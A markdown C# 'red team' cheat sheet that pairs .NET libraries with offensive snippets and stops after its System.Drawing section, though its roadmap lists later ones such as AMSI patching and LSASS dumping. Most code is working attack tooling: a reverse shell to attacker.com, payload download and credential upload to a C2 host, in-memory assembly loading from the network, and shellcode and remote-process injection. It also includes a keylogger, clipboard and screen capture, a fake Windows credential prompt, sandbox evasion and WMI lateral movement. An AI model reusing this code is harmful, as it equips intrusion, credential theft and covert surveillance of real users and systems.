# C# Red Team — System Libraries Cheat Sheet

---

## 🗺️ Learning Roadmap — Easiest → Most Critical

> Sections are ordered **bottom-up by difficulty**. Follow this order when studying.
> Click any link to jump directly to that section.

### 🟢 Phase 1 — Foundation `(Month 1-3)`
| # | Library | Why |
|:---:|---|---|
| 1 | [System — Console, Math, String, DateTime](#using-system--environment-class-advanced) | Language basics — must know before anything else |
| 2 | [System.IO](#using-systemio) | Read/write files, find credentials, stage payloads |
| 3 | [System.IO.Compression](#using-systemiocompression) | Compress exfil data, unpack payloads in memory |
| 4 | [System.Text.Json](#using-systemtextjson--c2-protocol-parsing) | Parse C2 responses, serialize beacon check-ins |

### 🟡 Phase 2 — Core Red Team `(Month 3-7)`
| # | Library | Why |
|:---:|---|---|
| 5 | [System.Net](#using-systemnet) | HTTP beacon, download payloads from C2 |
| 6 | [System.Net.Sockets](#using-systemnetsockets) | Reverse shell, raw TCP/UDP C2 channel |
| 7 | [System.Net.NetworkInformation](#using-systemnetnetworkinformation--network-recon) | Ping sweep, NIC/IP/gateway enumeration |
| 8 | [System.Diagnostics](#using-systemdiagnostics) | Execute commands, enumerate processes, hide windows |
| 9 | [System.Threading & Tasks](#using-systemthreading--using-systemthreadingtasks) | Async beacons, sandbox evasion via sleep checks |
| 10 | [Microsoft.Win32 — Registry](#microsoftwin32-registry) | Persistence via Run keys, enumerate autorun entries |
| 11 | [System — Environment](#using-system--environment-class-advanced) | Harvest env vars (AWS/GH tokens), uptime sandbox check |

### 🟠 Phase 3 — Post-Exploitation `(Month 7-11)`
| # | Library | Why |
|:---:|---|---|
| 12 | [System.Management](#using-systemmanagement) | WMI recon, lateral movement without PSExec |
| 13 | [System.DirectoryServices](#using-systemdirectoryservices) | AD enumeration, Kerberoastable accounts |
| 14 | [System.Security.Cryptography](#using-systemsecuritycryptography) | AES/RSA encrypt C2 traffic and payloads |
| 15 | [System.Security — DPAPI](#systemsecurity--dpapi--protecteddata) | Decrypt Chrome passwords, Credential Manager |
| 16 | [System.IO.Pipes](#using-systemiopipes) | SMB-based C2 channel, named pipe lateral movement |
| 17 | [System.Windows.Forms](#using-systemwindowsforms) | Keylogger, screenshot, clipboard capture |
| 18 | [System.Drawing](#using-systemdrawing) | Screenshot to memory (no disk write), steganography |

### 🔴 Phase 4 — Advanced / EDR Evasion `(Month 11-18)`
| # | Library | Why |
|:---:|---|---|
| 19 | [System.Reflection](#using-systemreflection) | In-memory assembly execution, AV bypass |
| 20 | [System.Runtime.InteropServices](#using-systemruntimeinteropservices) | P/Invoke, classic shellcode injection |
| 21 | [System.Security.Principal](#using-systemsecurityprincipal) | Token stealing, SeDebugPrivilege, impersonation |
| 22 | [Advanced Injection Techniques](#advanced-injection-techniques) | Hollowing, APC, DLL inject, thread hijacking |
| 23 | [EDR / AV Evasion](#edr--av-evasion-techniques) | AMSI/ETW patch, ntdll unhook, direct syscalls |
| 24 | [Credential Access — LSASS & SAM](#credential-access--lsass--sam) | Minidump, SAM hive, Credential Manager dump |
| 25 | [COM Interop & DCOM](#com-interop--dcom-lateral-movement) | LOLbin exec, DCOM lateral movement |
| 26 | [System.IdentityModel — Kerberos](#using-systemidentitymodel--kerberos--token-concepts) | S4U2Self, PTT, Kerberoasting chain |

---


---

## `using System`

```csharp
using System;

// CONSOLE
Console.WriteLine("Text");           // print with newline
Console.Write("Text");               // print without newline
Console.ReadLine();                  // get input from user
Console.Clear();                     // clear the screen
Console.ForegroundColor = ConsoleColor.Green;  // set text color
Console.ResetColor();                // reset text color

// ENVIRONMENT
Environment.MachineName              // computer name
Environment.UserName                 // current user name
Environment.OSVersion                // OS version
Environment.CurrentDirectory         // current directory path
Environment.GetEnvironmentVariable("PATH")  // get env variable
Environment.Exit(0);                 // exit the program

// MATH
Math.Abs(-5)                         // absolute value → 5
Math.Max(3, 7)                       // larger value → 7
Math.Min(3, 7)                       // smaller value → 3
Math.Pow(2, 8)                       // 2^8 → 256
Math.Sqrt(64)                        // square root → 8
Math.Round(3.7)                      // round → 4

// STRING
string s = "hello";
s.ToUpper()                          // → "HELLO"
s.ToLower()                          // → "hello"
s.Length                             // → 5
s.Contains("ell")                    // → true
s.Replace("hello", "bye")           // → "bye"
s.Trim()                             // remove leading/trailing spaces
s.Split(',')                         // split by comma → array
s.StartsWith("hel")                  // → true
s.Substring(0, 3)                    // → "hel"

// DATETIME
DateTime.Now                         // current date and time
DateTime.Now.ToString("dd/MM/yyyy")  // → "09/08/2026"
DateTime.Now.Hour                    // current hour
DateTime.Now.DayOfWeek              // day of the week

// CONVERT
Convert.ToInt32("42")               // string → int
Convert.ToString(42)                // int → string
Convert.ToDouble("3.14")            // string → double
Convert.ToBoolean(1)                // → true

// RANDOM
Random rnd = new Random();
rnd.Next(1, 100)                    // random int between 1-100
rnd.NextDouble()                    // random double between 0.0 - 1.0
```

**Syntax Example:**
```csharp
using System;

class Program
{
    static void Main()
    {
        // CONSOLE
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("=== System.Demo ===\n");
        Console.ResetColor();

        // ENVIRONMENT
        Console.WriteLine("--- Environment ---");
        Console.WriteLine($"Machine     : {Environment.MachineName}");
        Console.WriteLine($"User        : {Environment.UserName}");
        Console.WriteLine($"OS          : {Environment.OSVersion}");
        Console.WriteLine($"Directory   : {Environment.CurrentDirectory}");
        Console.WriteLine($"PATH        : {Environment.GetEnvironmentVariable("PATH")}");

        // MATH
        Console.WriteLine("\n--- Math ---");
        Console.WriteLine($"Abs(-5)     : {Math.Abs(-5)}");
        Console.WriteLine($"Max(3,7)    : {Math.Max(3, 7)}");
        Console.WriteLine($"Min(3,7)    : {Math.Min(3, 7)}");
        Console.WriteLine($"Pow(2,8)    : {Math.Pow(2, 8)}");
        Console.WriteLine($"Sqrt(64)    : {Math.Sqrt(64)}");
        Console.WriteLine($"Round(3.7)  : {Math.Round(3.7)}");

        // STRING
        Console.WriteLine("\n--- String ---");
        string s = "hello world";
        Console.WriteLine($"Original    : {s}");
        Console.WriteLine($"ToUpper     : {s.ToUpper()}");
        Console.WriteLine($"ToLower     : {s.ToLower()}");
        Console.WriteLine($"Length      : {s.Length}");
        Console.WriteLine($"Contains    : {s.Contains("world")}");
        Console.WriteLine($"Replace     : {s.Replace("hello", "bye")}");
        Console.WriteLine($"Trim        : {"  hi  ".Trim()}");
        Console.WriteLine($"StartsWith  : {s.StartsWith("hel")}");
        Console.WriteLine($"Substring   : {s.Substring(0, 5)}");
        string[] parts = s.Split(' ');
        Console.WriteLine($"Split       : [{parts[0]}] [{parts[1]}]");

        // DATETIME
        Console.WriteLine("\n--- DateTime ---");
        Console.WriteLine($"Now         : {DateTime.Now}");
        Console.WriteLine($"Formatted   : {DateTime.Now.ToString("dd/MM/yyyy")}");
        Console.WriteLine($"Hour        : {DateTime.Now.Hour}");
        Console.WriteLine($"DayOfWeek   : {DateTime.Now.DayOfWeek}");

        // CONVERT
        Console.WriteLine("\n--- Convert ---");
        Console.WriteLine($"ToInt32     : {Convert.ToInt32("42")}");
        Console.WriteLine($"ToString    : {Convert.ToString(42)}");
        Console.WriteLine($"ToDouble    : {Convert.ToDouble("3.14")}");
        Console.WriteLine($"ToBoolean   : {Convert.ToBoolean(1)}");

        // RANDOM
        Console.WriteLine("\n--- Random ---");
        Random rnd = new Random();
        Console.WriteLine($"Next(1,100) : {rnd.Next(1, 100)}");
        Console.WriteLine($"NextDouble  : {rnd.NextDouble():F4}");

        // INPUT
        Console.WriteLine("\n--- Input ---");
        Console.Write("Press Enter to exit...");
        Console.ReadLine();
    }
}
```

**Red Team use-cases:**
- `Environment.MachineName` / `UserName` / `OSVersion` → initial recon on victim machine
- `Environment.GetEnvironmentVariable` → harvest API keys, tokens, paths
- `Console.ForegroundColor` → color-coded C2 output for operator readability
- `Convert` + `Random` → payload ID generation, jitter calculation

---

## `using System.Collections`

```csharp
using System.Collections;
using System.Collections.Generic;

// ARRAYLIST — dynamic list, any type (legacy)
ArrayList list = new ArrayList();
list.Add("192.168.1.1");
list.Add(445);
list.Remove("192.168.1.1");
Console.WriteLine(list.Count);

// HASHTABLE — key/value, any type (legacy)
Hashtable table = new Hashtable();
table["hostname"] = "DC01";
table["ip"]       = "10.0.0.1";
table["os"]       = "Windows Server 2022";
foreach (DictionaryEntry entry in table)
    Console.WriteLine($"{entry.Key}: {entry.Value}");

// QUEUE — FIFO (task queue for C2 commands)
Queue cmdQueue = new Queue();
cmdQueue.Enqueue("whoami");
cmdQueue.Enqueue("ipconfig");
cmdQueue.Enqueue("net user");
string nextCmd = (string)cmdQueue.Dequeue();   // → "whoami"

// STACK — LIFO (undo / execution history)
Stack history = new Stack();
history.Push("scan 10.0.0.0/24");
history.Push("inject pid:1234");
string last = (string)history.Pop();           // → "inject pid:1234"

// ── GENERIC COLLECTIONS (modern — preferred) ──────────────────────────────

// LIST<T> — type-safe dynamic list
List<string> hosts = new List<string> { "10.0.0.1", "10.0.0.2" };
hosts.Add("10.0.0.3");
hosts.Remove("10.0.0.1");
hosts.Sort();
bool found = hosts.Contains("10.0.0.2");       // → true
string joined = string.Join(", ", hosts);

// DICTIONARY<K,V> — key/value store
Dictionary<string, string> creds = new Dictionary<string, string>();
creds["admin"]    = "Password123!";
creds["svc_sql"]  = "Sql@2024";
bool exists = creds.ContainsKey("admin");       // → true
foreach (var kv in creds)
    Console.WriteLine($"{kv.Key} : {kv.Value}");

// HASHSET<T> — unique values only (dedup scanned hosts)
HashSet<string> scanned = new HashSet<string>();
scanned.Add("10.0.0.1");
scanned.Add("10.0.0.1");   // duplicate — ignored
Console.WriteLine(scanned.Count);               // → 1

// QUEUE<T> — generic FIFO
Queue<string> tasks = new Queue<string>();
tasks.Enqueue("shell:whoami");
tasks.Enqueue("upload:implant.exe");
string task = tasks.Dequeue();

// SORTEDLIST<K,V> — auto-sorted by key
SortedList<int, string> portMap = new SortedList<int, string>();
portMap[445]  = "SMB";
portMap[80]   = "HTTP";
portMap[3389] = "RDP";
// iterates in sorted order: 80, 445, 3389
```

**Red Team use-cases:**
- `Dictionary<string,string>` → store harvested credentials (user → password)
- `Queue<string>` → C2 task queue (FIFO command processing)
- `HashSet<string>` → deduplicate scanned IPs / found hosts
- `List<string>` → accumulate loot (files found, users enumerated)
- `SortedList<int,string>` → organize port scan results by port number

---

---

## `using System.IO`

```csharp
using System.IO;

// FILE — read / write / check
File.WriteAllText("out.txt", "data");
File.WriteAllBytes("shell.bin", byteArray);
string content   = File.ReadAllText("out.txt");
byte[] raw       = File.ReadAllBytes("shell.bin");
string[] lines   = File.ReadAllLines("out.txt");
bool exists      = File.Exists("out.txt");
File.Copy("a.txt", "b.txt", overwrite: true);
File.Move("a.txt", "c.txt");
File.Delete("out.txt");

// DIRECTORY
Directory.CreateDirectory(@"C:\Temp\loot");
string[] files = Directory.GetFiles(@"C:\Users", "*.txt", SearchOption.AllDirectories);
string[] dirs  = Directory.GetDirectories(@"C:\Users");
Directory.Delete(@"C:\Temp\loot", recursive: true);

// PATH helpers
string full = Path.Combine(@"C:\Temp", "payload.exe");   // → C:\Temp\payload.exe
string ext  = Path.GetExtension("shell.ps1");             // → .ps1
string name = Path.GetFileNameWithoutExtension("a.exe");  // → a
string tmp  = Path.GetTempPath();                          // → C:\Users\...\AppData\Local\Temp\
string rand = Path.GetTempFileName();                      // creates a 0-byte temp file

// STREAMREADER / STREAMWRITER — line-by-line
using StreamReader sr = new StreamReader(@"C:\loot\creds.txt");
while (!sr.EndOfStream)
    Console.WriteLine(sr.ReadLine());

using StreamWriter sw = new StreamWriter(@"C:\loot\output.txt", append: true);
sw.WriteLine("captured data");

// MEMORYSTREAM — in-memory buffer (no disk touch)
byte[] payload = Convert.FromBase64String("TVqQAA...");
using MemoryStream ms = new MemoryStream(payload);

// FILESTREAM — low-level byte access
using FileStream fs = new FileStream("raw.bin", FileMode.Open, FileAccess.Read);
byte[] buf = new byte[fs.Length];
fs.Read(buf, 0, buf.Length);
```

**Red Team use-cases:**
- Recursive search for credentials, config files, SSH keys
- Drop / read payloads without touching `System.Diagnostics`
- MemoryStream for in-memory payload staging (no disk write)
- Temp-path abuse for payload staging

---

## `using System.IO.Compression`

```csharp
using System.IO;
using System.IO.Compression;

// CREATE a zip archive
ZipFile.CreateFromDirectory(@"C:\loot", @"C:\Temp\loot.zip");

// EXTRACT a zip archive
ZipFile.ExtractToDirectory(@"C:\Temp\loot.zip", @"C:\Temp\out");

// ADD entries to an existing archive programmatically
using ZipArchive archive = ZipFile.Open("bundle.zip", ZipArchiveMode.Update);
archive.CreateEntryFromFile("payload.exe", "svchost.exe");

// IN-MEMORY compression (no file on disk)
byte[] data = File.ReadAllBytes("payload.exe");
using MemoryStream compressed = new MemoryStream();
using (GZipStream gz = new GZipStream(compressed, CompressionMode.Compress))
    gz.Write(data, 0, data.Length);
byte[] compressedBytes = compressed.ToArray();

// IN-MEMORY decompression
using MemoryStream input  = new MemoryStream(compressedBytes);
using MemoryStream output = new MemoryStream();
using (GZipStream gz = new GZipStream(input, CompressionMode.Decompress))
    gz.CopyTo(output);
byte[] original = output.ToArray();

// DEFLATE (alternative to GZip — no header)
using DeflateStream ds = new DeflateStream(compressed, CompressionMode.Compress);
```

**Red Team use-cases:**
- Compress exfiltrated data before sending over C2
- Unpack compressed payloads in memory (bypass size-based AV heuristics)
- Bundle multiple tools into one archive, extract on demand

---

## `using System.Net`

```csharp
using System.Net;
using System.Net.Http;

// WEBCLIENT — simple downloads / uploads
WebClient wc = new WebClient();
wc.Headers.Add("User-Agent", "Mozilla/5.0");
string html    = wc.DownloadString("http://c2.example.com/cmd");
byte[] payload = wc.DownloadData("http://c2.example.com/shell.bin");
wc.DownloadFile("http://c2.example.com/tool.exe", @"C:\Temp\tool.exe");
wc.UploadString("http://c2.example.com/post", "POST", "loot=data");
wc.UploadData("http://c2.example.com/upload", File.ReadAllBytes("creds.txt"));

// HTTPCLIENT — modern async HTTP
using HttpClient client = new HttpClient();
client.DefaultRequestHeaders.Add("Authorization", "Bearer TOKEN");
string response  = await client.GetStringAsync("http://c2.example.com/task");
HttpResponseMessage r = await client.PostAsync(
    "http://c2.example.com/result",
    new StringContent("output=done")
);

// DNS lookup
IPHostEntry host = Dns.GetHostEntry("targetdomain.com");
foreach (IPAddress ip in host.AddressList)
    Console.WriteLine(ip);

// PROXY-AWARE request (blend into corp traffic)
WebProxy proxy = new WebProxy("http://proxy.corp.local:8080");
wc.Proxy = proxy;
```

**Red Team use-cases:**
- Stage-2 payload download from C2
- HTTP beacon check-in (poll for commands, post results)
- Exfiltrate data via HTTP POST
- DNS-based recon / enumeration

---

## `using System.Net.Sockets`

```csharp
using System.Net;
using System.Net.Sockets;
using System.Text;

// TCP REVERSE SHELL skeleton
TcpClient client = new TcpClient("attacker.com", 4444);
NetworkStream stream = client.GetStream();

// Read command from attacker
byte[] buf = new byte[4096];
int bytes = stream.Read(buf, 0, buf.Length);
string cmd = Encoding.ASCII.GetString(buf, 0, bytes);

// Send output back
byte[] output = Encoding.ASCII.GetBytes("result here");
stream.Write(output, 0, output.Length);

// TCP LISTENER (bind shell)
TcpListener listener = new TcpListener(IPAddress.Any, 9001);
listener.Start();
TcpClient conn = listener.AcceptTcpClient();

// UDP socket
UdpClient udp = new UdpClient();
udp.Send(Encoding.UTF8.GetBytes("ping"), 4, "c2.example.com", 5555);

// RAW socket (ICMP tunnel skeleton)
Socket raw = new Socket(AddressFamily.InterNetwork,
                         SocketType.Raw,
                         ProtocolType.Icmp);
raw.Bind(new IPEndPoint(IPAddress.Any, 0));

// CHECK if port is open (quick port scan)
bool IsOpen(string host, int port)
{
    try {
        using TcpClient tc = new TcpClient();
        return tc.ConnectAsync(host, port).Wait(300);
    } catch { return false; }
}
```

**Red Team use-cases:**
- Reverse / bind shell implementation
- Custom C2 channel (TCP/UDP)
- Internal port scanning (no external tools needed)
- ICMP / DNS tunneling

---

## `using System.Diagnostics`

```csharp
using System.Diagnostics;

// SPAWN a process (command execution)
Process.Start("cmd.exe", "/c whoami > C:\\Temp\\out.txt");

// SPAWN with hidden window + output capture
var psi = new ProcessStartInfo
{
    FileName               = "powershell.exe",
    Arguments              = "-nop -c \"Get-Process\"",
    RedirectStandardOutput = true,
    RedirectStandardError  = true,
    UseShellExecute        = false,
    CreateNoWindow         = true,     // hide window
    WindowStyle            = ProcessWindowStyle.Hidden
};
var p = Process.Start(psi);
string output = p.StandardOutput.ReadToEnd();
p.WaitForExit();

// LIST all running processes
foreach (Process proc in Process.GetProcesses())
    Console.WriteLine($"{proc.Id,-6} {proc.ProcessName}");

// GET specific process by name
Process[] targets = Process.GetProcessesByName("lsass");

// KILL a process
Process.GetProcessById(1234).Kill();

// OPEN files / URLs (spawns default handler)
Process.Start(new ProcessStartInfo("https://evil.com") { UseShellExecute = true });

// EVENT LOG (blue team detection / tampering)
EventLog log = new EventLog("Security");
foreach (EventLogEntry e in log.Entries)
    Console.WriteLine($"{e.TimeGenerated} | {e.Message}");

// PERFORMANCE COUNTERS
PerformanceCounter cpu = new PerformanceCounter("Processor", "% Processor Time", "_Total");
Console.WriteLine($"CPU: {cpu.NextValue()}%");
```

**Red Team use-cases:**
- Execute system commands with hidden windows
- Capture command output without spawning a visible terminal
- Enumerate processes for injection targets (lsass, explorer, etc.)
- Read/clear event logs to cover tracks

---

## `using System.Runtime.InteropServices`

```csharp
using System;
using System.Runtime.InteropServices;

// P/INVOKE — call native Windows API functions
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(
    IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

// SHELLCODE INJECTION (classic VirtualAlloc + CreateThread)
byte[] shellcode = new byte[] { 0x90, 0x90, /* ... msfvenom output ... */ };

IntPtr mem = VirtualAlloc(IntPtr.Zero,
                           (uint)shellcode.Length,
                           0x3000,   // MEM_COMMIT | MEM_RESERVE
                           0x40);    // PAGE_EXECUTE_READWRITE

Marshal.Copy(shellcode, 0, mem, shellcode.Length);

IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(thread, 0xFFFFFFFF);

// OPEN PROCESS (for remote injection)
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int pid);

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr,
                                     uint size, uint type, uint protect);

[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr,
                                       byte[] buf, uint size, out int written);

// STRUCT MARSHALLING
[StructLayout(LayoutKind.Sequential)]
struct STARTUPINFO { public int cb; /* ... */ }

// CHECK pointer size (32 vs 64-bit)
bool is64bit = Marshal.SizeOf(typeof(IntPtr)) == 8;
```

**Red Team use-cases:**
- Shellcode injection into current or remote process
- API hashing / dynamic resolution (evade static analysis)
- Token manipulation via `advapi32.dll`
- Direct syscalls skeleton (avoid EDR hooks)

---

## `using System.Reflection`

```csharp
using System.Reflection;

// LOAD assembly from bytes (in-memory — no disk touch)
byte[] raw = File.ReadAllBytes("tool.exe");
Assembly asm = Assembly.Load(raw);

// LOAD from URL (download + execute in memory)
byte[] downloaded = new System.Net.WebClient().DownloadData("http://c2/tool.dll");
Assembly asmRemote = Assembly.Load(downloaded);

// FIND and INVOKE entry point
MethodInfo entry = asmRemote.EntryPoint;
entry.Invoke(null, new object[] { new string[] { "-arg1" } });

// INVOKE a specific method by name (avoid static references)
Type t   = asm.GetType("Namespace.ClassName");
object obj = Activator.CreateInstance(t);
MethodInfo m = t.GetMethod("Run");
m.Invoke(obj, new object[] { "param" });

// INSPECT types (useful for post-ex recon of loaded assemblies)
foreach (Type type in asm.GetTypes())
    foreach (MethodInfo method in type.GetMethods())
        Console.WriteLine($"{type.Name}.{method.Name}");

// LIST currently loaded assemblies
foreach (Assembly a in AppDomain.CurrentDomain.GetAssemblies())
    Console.WriteLine(a.FullName);

// ACCESS private fields (bypass encapsulation)
FieldInfo fi = t.GetField("_secret", BindingFlags.NonPublic | BindingFlags.Instance);
string secret = (string)fi.GetValue(obj);
```

**Red Team use-cases:**
- Execute .NET payloads entirely in memory (no `WriteFile` call)
- Bypass application whitelisting (living off the land)
- Reflective DLL loading equivalent in managed code
- Dynamic invocation to avoid static IAT analysis

---

## `using System.Security.Cryptography`

```csharp
using System.Security.Cryptography;
using System.Text;

// AES ENCRYPT
byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
{
    using Aes aes = Aes.Create();
    aes.Key = key; aes.IV = iv;
    using ICryptoTransform enc = aes.CreateEncryptor();
    return enc.TransformFinalBlock(data, 0, data.Length);
}

// AES DECRYPT
byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
{
    using Aes aes = Aes.Create();
    aes.Key = key; aes.IV = iv;
    using ICryptoTransform dec = aes.CreateDecryptor();
    return dec.TransformFinalBlock(data, 0, data.Length);
}

// GENERATE random AES key + IV
byte[] key = RandomNumberGenerator.GetBytes(32);  // AES-256
byte[] iv  = RandomNumberGenerator.GetBytes(16);

// RSA key pair (C2 key exchange)
using RSA rsa = RSA.Create(2048);
string pubKey  = Convert.ToBase64String(rsa.ExportRSAPublicKey());
string privKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey());
byte[] encrypted = rsa.Encrypt(data, RSAEncryptionPadding.OaepSHA256);
byte[] decrypted = rsa.Decrypt(encrypted, RSAEncryptionPadding.OaepSHA256);

// MD5 HASH (credential comparison / file fingerprinting)
string MD5Hash(string input)
{
    using MD5 md5 = MD5.Create();
    byte[] h = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
    return BitConverter.ToString(h).Replace("-", "").ToLower();
}

// SHA256
byte[] SHA256Hash(byte[] data)
{
    using SHA256 sha = SHA256.Create();
    return sha.ComputeHash(data);
}

// HMAC (message authentication for C2)
byte[] HmacSign(byte[] data, byte[] key)
{
    using HMACSHA256 hmac = new HMACSHA256(key);
    return hmac.ComputeHash(data);
}

// SECURE RANDOM bytes
byte[] nonce = RandomNumberGenerator.GetBytes(16);
```

**Red Team use-cases:**
- Encrypt C2 communications (AES-256 beacon traffic)
- Encrypt payloads at rest to bypass static AV
- RSA key exchange for implant / C2 handshake
- Hash comparison for credential validation

---

## `using System.Threading` & `using System.Threading.Tasks`

```csharp
using System.Threading;
using System.Threading.Tasks;

// SLEEP (anti-sandbox: real malware sleeps, sandboxes skip sleep)
Thread.Sleep(30000);                        // block 30 seconds
await Task.Delay(30000);                    // async version

// DETECT sandbox (check if sleep was skipped)
var sw = System.Diagnostics.Stopwatch.StartNew();
Thread.Sleep(10000);
if (sw.Elapsed.TotalSeconds < 8)
    Environment.Exit(0);                    // sandbox detected → quit

// BACKGROUND THREAD (persistent beacon)
Thread beacon = new Thread(() =>
{
    while (true)
    {
        CheckIn();                          // poll C2
        Thread.Sleep(60000);               // sleep 60s between beacons
    }
});
beacon.IsBackground = true;
beacon.Start();

// ASYNC parallel port scanner
async Task ScanAsync(string host, int[] ports)
{
    var tasks = ports.Select(async port =>
    {
        try {
            using var tc = new System.Net.Sockets.TcpClient();
            await tc.ConnectAsync(host, port).WaitAsync(TimeSpan.FromMilliseconds(500));
            Console.WriteLine($"OPEN: {host}:{port}");
        } catch { }
    });
    await Task.WhenAll(tasks);
}

// CANCELLATION TOKEN (graceful shutdown)
CancellationTokenSource cts = new CancellationTokenSource();
Task t = Task.Run(() => BeaconLoop(cts.Token));
cts.CancelAfter(TimeSpan.FromHours(1));     // auto-expire implant after 1h

// MUTEX (single instance — avoid double execution)
bool created;
Mutex mutex = new Mutex(true, "Global\\UniqueImplantName", out created);
if (!created) Environment.Exit(0);
```

**Red Team use-cases:**
- Anti-sandbox sleep checks
- Async parallel port / host scanning
- Persistent background beacon loop
- Implant self-expiry via CancellationToken

---

## `using System.Management`

```csharp
using System.Management;

// QUERY local WMI (system recon)
void WmiQuery(string query)
{
    var searcher = new ManagementObjectSearcher(query);
    foreach (ManagementObject obj in searcher.Get())
        foreach (PropertyData p in obj.Properties)
            Console.WriteLine($"{p.Name}: {p.Value}");
}

WmiQuery("SELECT * FROM Win32_OperatingSystem");   // OS info
WmiQuery("SELECT * FROM Win32_Process");           // process list
WmiQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
WmiQuery("SELECT * FROM Win32_UserAccount");       // local users
WmiQuery("SELECT * FROM Win32_LogicalDisk");       // drives
WmiQuery("SELECT * FROM Win32_Service");           // services
WmiQuery("SELECT * FROM AntiVirusProduct");        // AV detection (root\SecurityCenter2)

// REMOTE WMI (lateral movement — requires credentials)
ConnectionOptions options = new ConnectionOptions
{
    Username = "DOMAIN\\admin",
    Password = "Password123!"
};
ManagementScope scope = new ManagementScope(@"\\TARGET-PC\root\cimv2", options);
scope.Connect();
ManagementObjectSearcher remote = new ManagementObjectSearcher(scope,
    new ObjectQuery("SELECT * FROM Win32_Process"));

// REMOTE PROCESS CREATION via WMI (lateral movement, no PSExec needed)
ManagementClass wmi = new ManagementClass(scope,
    new ManagementPath("Win32_Process"), null);
object[] args = { "cmd.exe /c whoami > C:\\Temp\\out.txt", null, null, 0 };
wmi.InvokeMethod("Create", args);

// WATCH for process creation (live EDR evasion recon)
ManagementEventWatcher watcher = new ManagementEventWatcher(
    new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
watcher.EventArrived += (s, e) =>
    Console.WriteLine("New process: " + e.NewEvent["ProcessName"]);
watcher.Start();
```

**Red Team use-cases:**
- Agentless local/remote system enumeration (no extra binaries)
- Lateral movement via WMI process creation
- AV/EDR product detection
- Real-time process monitoring for defensive tool detection

---

## `using System.DirectoryServices`

```csharp
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;

// LDAP — enumerate Active Directory
DirectoryEntry root = new DirectoryEntry("LDAP://dc=corp,dc=local",
                                          "user", "pass");

// SEARCH for all users
DirectorySearcher searcher = new DirectorySearcher(root)
{
    Filter     = "(&(objectClass=user)(objectCategory=person))",
    PageSize   = 1000
};
searcher.PropertiesToLoad.AddRange(new[] { "sAMAccountName", "mail", "memberOf" });

foreach (SearchResult result in searcher.FindAll())
{
    Console.WriteLine(result.Properties["sAMAccountName"][0]);
    Console.WriteLine(result.Properties["mail"][0]);
}

// SEARCH for all computers
searcher.Filter = "(objectClass=computer)";
searcher.PropertiesToLoad.Add("name");
foreach (SearchResult r in searcher.FindAll())
    Console.WriteLine(r.Properties["name"][0]);

// SEARCH for all groups
searcher.Filter = "(objectClass=group)";

// SEARCH for Domain Admins membership
searcher.Filter = "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))";

// FIND Kerberoastable accounts (SPN set)
searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
searcher.PropertiesToLoad.AddRange(new[] { "sAMAccountName", "servicePrincipalName" });

// PRINCIPAL CONTEXT (validate credentials)
using PrincipalContext ctx = new PrincipalContext(ContextType.Domain, "corp.local");
bool valid = ctx.ValidateCredentials("user", "pass");

// GET user's group membership
UserPrincipal up = UserPrincipal.FindByIdentity(ctx, "targetuser");
foreach (GroupPrincipal gp in up.GetGroups())
    Console.WriteLine(gp.Name);
```

**Red Team use-cases:**
- Full AD enumeration without external tools (SharpHound replacement for targeted queries)
- Identify Kerberoastable / ASREPRoastable accounts
- Discover Domain Admins and privileged groups
- Credential validation for password spray results

---

## `using System.Windows.Forms`

```csharp
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;

// KEYLOGGER — hook via low-level Windows API
[DllImport("user32.dll")]
static extern short GetAsyncKeyState(int vKey);

void KeyloggerLoop()
{
    while (true)
    {
        for (int key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
                File.AppendAllText("keys.txt", ((Keys)key).ToString() + "\n");
        }
        Thread.Sleep(10);
    }
}

// SCREENSHOT
Screen screen = Screen.PrimaryScreen;
Bitmap bmp    = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
using Graphics g = Graphics.FromImage(bmp);
g.CopyFromScreen(Point.Empty, Point.Empty, screen.Bounds.Size);
bmp.Save(@"C:\Temp\screen.png", System.Drawing.Imaging.ImageFormat.Png);

// CLIPBOARD capture
string clip = Clipboard.GetText();
File.AppendAllText("clipboard.txt", clip);

// FAKE CREDENTIAL DIALOG (phishing inside the org)
string userInput = Microsoft.VisualBasic.Interaction.InputBox(
    "Session expired. Re-enter your credentials:", "Windows Security");

// SEND keys to a window (UI automation / evasion)
SendKeys.SendWait("{ENTER}");
```

**Red Team use-cases:**
- Keylogger implementation
- Desktop screenshot capture and exfil
- Clipboard monitoring (may contain passwords/tokens)
- Fake credential prompt (internal phishing)

---

## `using System.Drawing`

```csharp
using System.Drawing;
using System.Drawing.Imaging;

// SCREENSHOT (no WinForms dependency needed)
Rectangle bounds = new Rectangle(0, 0,
    SystemInformation.PrimaryMonitorSize.Width,
    SystemInformation.PrimaryMonitorSize.Height);
using Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
using (Graphics g = Graphics.FromImage(screenshot))
    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);

// SAVE as JPEG (smaller file → faster exfil)
screenshot.Save("screen.jpg", ImageFormat.Jpeg);

// SAVE to memory stream (send directly over C2 without writing to disk)
using MemoryStream ms = new MemoryStream();
screenshot.Save(ms, ImageFormat.Png);
